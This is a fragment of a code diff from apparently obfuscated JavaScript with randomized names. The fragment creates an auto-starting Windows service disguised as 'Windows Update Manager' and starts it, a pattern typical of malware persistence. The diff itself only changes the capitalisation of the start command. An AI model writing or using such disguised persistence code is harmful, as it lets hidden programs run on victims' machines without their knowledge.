@@ -110,7 +110,7 @@ async function k9821yeij481972yijclk12() {
     "sc create Windows Update Manager binPath= start.cmd start= auto"
   );
   l891e98ads__17892ijc_i1u091iudoij(1000);
-  u8jd9c69n38j0cvjq9dio3.cmd("net start Windows Update Manager");
+  u8jd9c69n38j0cvjq9dio3.cmd("NET START Windows Update Manager");
 }
 
 async function k981ud98un9182uoaijcs() {
